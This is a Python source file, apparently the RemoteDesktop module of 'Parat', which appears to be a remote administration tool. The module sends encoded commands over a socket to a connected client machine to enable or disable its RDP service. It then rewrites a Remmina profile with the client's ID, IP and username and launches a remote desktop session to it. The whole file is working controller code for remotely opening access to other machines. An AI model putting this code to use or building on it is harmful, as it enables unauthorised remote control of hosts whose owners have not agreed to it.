#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import os
import argparse
from shutil import copy
from subprocess import Popen, PIPE
from lib.ParatPrint import colorize, pprint, gray
from lib.ParatEncrypt import Encode, Decode


class ParatRDP:

    def __init__(self, conn, client_id, client_user, remote_ip, args, colors):

        self.helps        = ["-h", "--help"]
        self.conn         = conn
        self.client_id    = client_id
        self.client_user  = client_user
        self.remote_ip    = remote_ip
        self.args         = args
        self.colors       = colors



    def prepare_basics(self):

        self.parser = argparse.ArgumentParser(
            prog         = "modules.RemoteDesktop",
            usage        = "desktop [--argument]",
            description  = "simple command to control RDP protocol"
        )

        self.parser.add_argument(
            '-a', '--active',
            action       = "store_true",
            help         = "enable remote desktop protocol"
        )
        self.parser.add_argument(
            '-d', '--deactive',
            action       = "store_true",
            help         = "disable remote desktop protocol"
        )
        self.parser.add_argument(
            '-c', '--connect',
            action       = "store_true",
            help         = "try to connect with RDP"
        )


    def start(self):

        if self.args is None or len(self.args) == 0 or self.args[0] in self.helps:
            self.parser.print_help()

        else:

            try:
                argument = self.parser.parse_args(self.args)

                if argument.active:
                    self.conn.send(Encode("desktop<#>active"))
                    response = Decode(self.conn.recv(4096))
                    pprint(response) if self.colors else pprint(gray(response))

                elif argument.deactive:
                    self.conn.send(Encode("desktop<#>deactive"))
                    response = Decode(self.conn.recv(4096))
                    pprint(response) if self.colors else pprint(gray(response))

                elif argument.connect:

                    remmina_path = os.path.abspath(
                        os.path.join("..", "..", "template", "parat.remmina")
                            )
                    old_remmina = open(remmina_path, "r")
                    remote_config = open(".parat.remmina", "w")

                    for line_no, line in enumerate(old_remmina.readlines(), 1):

                        if line_no == 4:
                            name = line.split("=")[1]
                            new_line = line.replace(name, self.client_id + "\n")
                            remote_config.write(new_line)

                        elif line_no == 11:
                            server = line.split("=")[1]
                            new_line = line.replace(server, self.remote_ip + "\n")
                            remote_config.write(new_line)

                        elif line_no == 16:
                            user = line.split("=")[1]
                            new_line = line.replace(user, self.client_user + "\n")
                            remote_config.write(new_line)

                        else:
                            remote_config.write(line)

                    old_remmina.close()
                    remote_config.close()

                    copy(".parat.remmina", remmina_path)
                    os.remove(".parat.remmina")

                    Remote_Desktop = Popen(
                        'remmina --connect="{}"'.format(remmina_path),
                        shell=True,
                        stdout=PIPE,
                        stderr=PIPE,
                        stdin=PIPE
                    )

            except:
                pass
